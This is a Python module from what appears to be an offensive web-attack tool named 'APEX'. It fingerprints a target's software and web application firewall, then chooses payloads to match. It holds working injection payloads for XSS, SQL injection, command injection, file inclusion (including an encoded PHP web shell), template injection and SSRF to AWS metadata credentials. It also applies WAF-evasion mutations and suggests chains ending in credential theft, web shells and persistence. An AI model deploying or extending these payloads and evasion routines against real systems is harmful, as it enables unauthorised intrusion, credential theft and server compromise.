"""
APEX Adaptive Intelligence Engine
Fingerprints targets, selects optimal payloads, learns from responses
"""
import re
import requests
from urllib.parse import urlparse
from config import Config

# Framework/Technology fingerprints
TECH_FINGERPRINTS = {
    'PHP': [r'\.php', r'PHPSESSID', r'X-Powered-By: PHP', r'laravel_session', r'wordpress'],
    'ASP.NET': [r'\.aspx', r'\.asp', r'ASP\.NET', r'__VIEWSTATE', r'X-AspNet-Version'],
    'Java': [r'\.jsp', r'\.do', r'\.action', r'JSESSIONID', r'Spring', r'Apache Struts'],
    'Node.js': [r'express', r'connect\.sid', r'x-powered-by: Express', r'koa'],
    'Python': [r'\.py', r'Django', r'csrftoken', r'Flask', r'werkzeug'],
    'Ruby': [r'\.rb', r'Rails', r'_session_id', r'Rack'],
    'Go': [r'go/.*runtime', r'Gorilla'],
    'React': [r'react', r'__REACT_DEVTOOLS', r'react-root'],
    'Vue': [r'vue', r'__vue__', r'data-v-'],
    'Angular': [r'ng-version', r'angular', r'_ngcontent'],
    'jQuery': [r'jquery', r'jQuery'],
    'WordPress': [r'wp-content', r'wp-includes', r'wordpress'],
    'Joomla': [r'joomla', r'com_content'],
    'Drupal': [r'drupal', r'sites/all'],
    'Magento': [r'magento', r'mage/', r'varien'],
    'Shopify': [r'shopify', r'myshopify'],
    'Cloudflare': [r'cf-ray', r'__cfduid', r'cloudflare'],
    'AWS WAF': [r'x-amz-cf-id', r'CloudFront'],
    'ModSecurity': [r'Mod_Security', r'This request was blocked'],
    'Nginx': [r'nginx', r'Server: nginx'],
    'Apache': [r'Apache', r'Server: Apache'],
    'IIS': [r'IIS', r'Microsoft-IIS', r'Server: Microsoft'],
    'Tomcat': [r'Apache Tomcat', r'Apache-Coyote'],
    'MySQL': [r'mysql', r'MySQL'],
    'PostgreSQL': [r'postgresql', r'PostgreSQL'],
    'MSSQL': [r'Microsoft SQL', r'MSSQL', r'SqlServer'],
    'SQLite': [r'sqlite', r'SQLite'],
    'MongoDB': [r'mongodb', r'MongoDB'],
    'Redis': [r'redis', r'Redis'],
    'Firebase': [r'firebase', r'firestore'],
    'GraphQL': [r'graphql', r'__schema', r'GraphQL'],
    'REST API': [r'/api/', r'/v1/', r'/v2/', r'application/json'],
}

# OS detection patterns
OS_FINGERPRINTS = {
    'Linux': [r'Linux', r'Ubuntu', r'Debian', r'CentOS', r'Fedora', r'Red Hat'],
    'Windows': [r'Windows', r'Win32', r'Win64', r'IIS', r'Microsoft'],
    'macOS': [r'Darwin', r'macOS', r'Mac OS X'],
}

# WAF detection patterns
WAF_FINGERPRINTS = {
    'Cloudflare': [r'cf-ray', r'__cfduid', r'cloudflare-nginx', r'CF-Cache-Status'],
    'AWS WAF': [r'x-amz-cf-id', r'X-Amz-Cf-Pop', r'CloudFront'],
    'Akamai': [r'Akamai', r'X-Akamai'],
    'Imperva': [r'Imperva', r'X-CDN', r'incapsula'],
    'Sucuri': [r'Sucuri', r'X-Sucuri'],
    'ModSecurity': [r'Mod_Security', r'ModSecurity', r'Not Acceptable'],
    'F5 BIG-IP': [r'BIG-IP', r'F5', r'X-WA-Info'],
    'Barracuda': [r'Barracuda', r'barra_counter'],
    'Fortinet': [r'FortiWeb', r'Fortinet'],
    'Wordfence': [r'Wordfence', r'wfLog'],
}


class AdaptiveEngine:
    """Intelligent engine that fingerprints targets and selects optimal attack strategies."""

    def __init__(self):
        self.fingerprints = {}
        self.learning_cache = {}
        self.evasion_level = 0  # 0=none, 1=basic, 2=aggressive, 3=extreme

    def fingerprint_target(self, target_url, session=None):
        """Fingerprint a target to identify technologies, frameworks, and defenses."""
        if not session:
            session = requests.Session()
            session.verify = False

        result = {
            'url': target_url,
            'technologies': [],
            'os': 'Unknown',
            'waf': None,
            'server': 'Unknown',
            'cms': None,
            'language': 'Unknown',
            'database': None,
            'frontend': None,
            'api_type': None,
            'has_graphql': False,
            'has_rest_api': False,
            'uses_jwt': False,
            'uses_csrf': False,
            'headers': {},
            'cookies': {},
        }

        try:
            r = session.get(target_url, timeout=10, allow_redirects=True)
            result['headers'] = dict(r.headers)
            result['cookies'] = dict(r.cookies)
            result['status_code'] = r.status_code
            result['server'] = r.headers.get('Server', 'Unknown')

            # Check all headers and body for fingerprints
            full_text = r.text[:50000]  # First 50KB
            header_text = '\n'.join(f'{k}: {v}' for k, v in r.headers.items())

            for tech, patterns in TECH_FINGERPRINTS.items():
                for pattern in patterns:
                    if re.search(pattern, full_text, re.IGNORECASE) or re.search(pattern, header_text, re.IGNORECASE):
                        if tech not in result['technologies']:
                            result['technologies'].append(tech)

            # OS detection
            for os_name, patterns in OS_FINGERPRINTS.items():
                for pattern in patterns:
                    if re.search(pattern, full_text, re.IGNORECASE) or re.search(pattern, header_text, re.IGNORECASE):
                        result['os'] = os_name
                        break

            # WAF detection
            for waf_name, patterns in WAF_FINGERPRINTS.items():
                for pattern in patterns:
                    if re.search(pattern, full_text, re.IGNORECASE) or re.search(pattern, header_text, re.IGNORECASE):
                        result['waf'] = waf_name
                        self.evasion_level = 2  # Auto-enable aggressive evasion
                        break
                if result['waf']:
                    break

            # CMS detection
            cms_map = {'WordPress': 'WordPress', 'Joomla': 'Joomla', 'Drupal': 'Drupal',
                       'Magento': 'Magento', 'Shopify': 'Shopify'}
            for tech in result['technologies']:
                if tech in cms_map:
                    result['cms'] = cms_map[tech]
                    break

            # Language detection
            lang_map = {'PHP': 'PHP', 'ASP.NET': 'ASP.NET', 'Java': 'Java',
                        'Node.js': 'Node.js', 'Python': 'Python', 'Ruby': 'Ruby', 'Go': 'Go'}
            for tech in result['technologies']:
                if tech in lang_map:
                    result['language'] = lang_map[tech]
                    break

            # Database detection
            db_map = {'MySQL': 'MySQL', 'PostgreSQL': 'PostgreSQL', 'MSSQL': 'MSSQL',
                      'SQLite': 'SQLite', 'MongoDB': 'MongoDB', 'Redis': 'Redis', 'Firebase': 'Firebase'}
            for tech in result['technologies']:
                if tech in db_map:
                    result['database'] = db_map[tech]
                    break

            # Frontend detection
            fe_map = {'React': 'React', 'Vue': 'Vue.js', 'Angular': 'Angular', 'jQuery': 'jQuery'}
            for tech in result['technologies']:
                if tech in fe_map:
                    result['frontend'] = fe_map[tech]
                    break

            # API detection
            if 'GraphQL' in result['technologies']:
                result['has_graphql'] = True
                result['api_type'] = 'GraphQL'
            if 'REST API' in result['technologies']:
                result['has_rest_api'] = True
                if not result['api_type']:
                    result['api_type'] = 'REST'

            # JWT detection
            if re.search(r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+', full_text):
                result['uses_jwt'] = True

            # CSRF detection
            if re.search(r'csrf|_token|xsrf|nonce', full_text, re.IGNORECASE):
                result['uses_csrf'] = True

        except Exception as e:
            result['error'] = str(e)

        self.fingerprints[target_url] = result
        return result

    def get_optimal_payloads(self, vuln_type, fingerprint):
        """Select optimal payloads based on target fingerprint."""
        payloads = []
        lang = fingerprint.get('language', 'Unknown')
        db = fingerprint.get('database', 'Unknown')
        server = fingerprint.get('server', 'Unknown')
        waf = fingerprint.get('waf')
        cms = fingerprint.get('cms')
        frontend = fingerprint.get('frontend')

        if vuln_type == 'xss':
            # Framework-specific XSS
            if frontend == 'React':
                payloads.extend([
                    'javascript:alert(1)//',
                    '"><img src=x onerror=alert(1)>',
                    '"><svg onload=alert(1)>',
                ])
            elif frontend == 'Angular':
                payloads.extend([
                    '{{constructor.constructor(\'alert(1)\')()}}',
                    '"><img src=x onerror=alert(1)>',
                ])
            elif frontend == 'Vue.js':
                payloads.extend([
                    '{{constructor.constructor(\'alert(1)\')()}}',
                    'v-html="<img src=x onerror=alert(1)>"',
                ])
            else:
                payloads.extend([
                    '<script>alert(1)</script>',
                    '"><script>alert(1)</script>',
                    '<img src=x onerror=alert(1)>',
                    '<svg onload=alert(1)>',
                ])

        elif vuln_type == 'sqli':
            if db == 'MySQL':
                payloads.extend([
                    "' OR 1=1--",
                    "' UNION SELECT @@version--",
                    "' UNION SELECT table_name FROM information_schema.tables--",
                    "' AND SLEEP(5)--",
                ])
            elif db == 'PostgreSQL':
                payloads.extend([
                    "' OR 1=1--",
                    "' UNION SELECT version()--",
                    "' UNION SELECT table_name FROM information_schema.tables--",
                    "'; SELECT pg_sleep(5)--",
                ])
            elif db == 'MSSQL':
                payloads.extend([
                    "' OR 1=1--",
                    "' UNION SELECT @@version--",
                    "' UNION SELECT table_name FROM information_schema.tables--",
                    "'; WAITFOR DELAY '0:0:5'--",
                ])
            elif db == 'MongoDB':
                payloads.extend([
                    '{"$gt": ""}',
                    '{"$ne": null}',
                    '{"$regex": ".*"}',
                    '[$gt]',
                ])
            else:
                payloads.extend([
                    "' OR '1'='1",
                    "' OR 1=1--",
                    '" OR 1=1--',
                    "' UNION SELECT 1,2,3--",
                ])

        elif vuln_type == 'cmdi':
            if fingerprint.get('os') == 'Windows':
                payloads.extend([
                    '| dir',
                    '& dir',
                    '| type C:\\Windows\\win.ini',
                    '| powershell -c "Get-Process"',
                ])
            else:
                payloads.extend([
                    '; id',
                    '| id',
                    '`id`',
                    '$(id)',
                    '; uname -a',
                ])

        elif vuln_type == 'lfi':
            if lang == 'PHP':
                payloads.extend([
                    '../../../etc/passwd',
                    'php://filter/convert.base64-encode/resource=index',
                    'php://filter/read=convert.base64-encode/resource=../../etc/passwd',
                    'expect://id',
                    'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=',
                ])
            elif lang == 'Java':
                payloads.extend([
                    '../../../WEB-INF/web.xml',
                    '../../../etc/passwd',
                    'file:///etc/passwd',
                ])
            else:
                payloads.extend([
                    '../../../etc/passwd',
                    '....//....//....//etc/passwd',
                    '/etc/passwd',
                ])

        elif vuln_type == 'ssti':
            if lang == 'Python':
                payloads.extend([
                    '{{7*7}}',
                    '{{config}}',
                    '{{self.__init__.__globals__["__builtins__"]["__import__"]("os").popen("id").read()}}',
                ])
            elif lang == 'Java':
                payloads.extend([
                    '${7*7}',
                    '${T(java.lang.Runtime).getRuntime().exec("id")}',
                ])
            elif lang == 'PHP':
                payloads.extend([
                    '{{7*7}}',
                    '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}',
                ])
            else:
                payloads.extend([
                    '{{7*7}}',
                    '${7*7}',
                    '<%= 7*7 %>',
                ])

        elif vuln_type == 'ssrf':
            if fingerprint.get('waf') == 'AWS WAF':
                payloads.extend([
                    'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
                    'http://instance-data/latest/meta-data/',
                ])
            else:
                payloads.extend([
                    'http://169.254.169.254/latest/meta-data/',
                    'http://127.0.0.1:8080/',
                    'http://localhost:22/',
                    'file:///etc/passwd',
                ])

        # Add WAF evasion variants if WAF detected
        if waf:
            payloads = self._apply_waf_evasion(payloads, vuln_type, waf)

        return payloads

    def _apply_waf_evasion(self, payloads, vuln_type, waf):
        """Apply WAF-specific evasion techniques to payloads."""
        evaded = []
        for p in payloads:
            evaded.append(p)  # Keep original
            if vuln_type == 'xss':
                evaded.append(p.replace('<script>', '<ScRiPt>').replace('</script>', '</ScRiPt>'))
                evaded.append(p.replace('alert', '\\u0061lert'))
                evaded.append(p.replace('onerror', 'onerror ').replace('=', ' ='))
            elif vuln_type == 'sqli':
                evaded.append(p.replace(' ', '/**/'))
                evaded.append(p.replace('OR', 'OoRr').replace('AND', 'AaNnDd'))
                evaded.append(p.replace('UNION', 'UNI/**/ON').replace('SELECT', 'SEL/**/ECT'))
            elif vuln_type == 'cmdi':
                evaded.append(p.replace(';', '%0a'))
                evaded.append(p.replace(' ', '${IFS}'))
        return list(set(evaded))  # Deduplicate

    def learn_from_response(self, target_url, param, payload, response, vuln_type):
        """Learn from scan responses to improve future attacks."""
        key = f"{target_url}|{param}|{vuln_type}"
        if key not in self.learning_cache:
            self.learning_cache[key] = {'blocked_payloads': [], 'successful_payloads': [], 'reflected': False}

        if response.status_code == 403 or response.status_code == 406:
            self.learning_cache[key]['blocked_payloads'].append(payload)
            self.evasion_level = min(3, self.evasion_level + 1)
        elif response.status_code == 200:
            self.learning_cache[key]['reflected'] = True
            if payload in response.text:
                self.learning_cache[key]['successful_payloads'].append(payload)

    def should_evade(self):
        """Check if evasion is needed based on learning."""
        return self.evasion_level >= 1

    def get_evasion_level(self):
        """Get current evasion level."""
        return self.evasion_level

    def get_fingerprint(self, target_url):
        """Get cached fingerprint for a target."""
        return self.fingerprints.get(target_url, {})

    def suggest_attack_chain(self, fingerprint, vulnerabilities):
        """Suggest optimal attack chain based on fingerprint and found vulns."""
        chains = []
        vuln_types = [v.get('type', '') for v in vulnerabilities]

        if 'xss' in vuln_types and 'csrf' in vuln_types:
            chains.append({
                'name': 'XSS → CSRF → Account Takeover',
                'steps': ['exploit_xss', 'craft_csrf', 'hijack_session'],
                'confidence': 'high'
            })

        if 'sqli' in vuln_types:
            chains.append({
                'name': 'SQLi → Database Dump → Credential Theft',
                'steps': ['exploit_sqli', 'dump_tables', 'extract_hashes', 'crack_or_reuse'],
                'confidence': 'high'
            })

        if 'ssrf' in vuln_types and fingerprint.get('waf') == 'AWS WAF':
            chains.append({
                'name': 'SSRF → AWS Metadata → IAM Key Theft',
                'steps': ['exploit_ssrf', 'fetch_metadata', 'extract_credentials', 'validate_keys'],
                'confidence': 'high'
            })

        if 'lfi' in vuln_types and fingerprint.get('language') == 'PHP':
            chains.append({
                'name': 'LFI → Log Poisoning → RCE',
                'steps': ['exploit_lfi', 'poison_logs', 'include_log', 'execute_command'],
                'confidence': 'medium'
            })

        if 'file_upload' in vuln_types:
            chains.append({
                'name': 'File Upload → Web Shell → RCE',
                'steps': ['bypass_upload', 'upload_shell', 'trigger_shell', 'deploy_beacon'],
                'confidence': 'high'
            })

        if 'ssti' in vuln_types:
            chains.append({
                'name': 'SSTI → RCE → Full Server Compromise',
                'steps': ['exploit_ssti', 'achieve_rce', 'establish_persistence'],
                'confidence': 'high'
            })

        return chains


# Global instance
engine = AdaptiveEngine()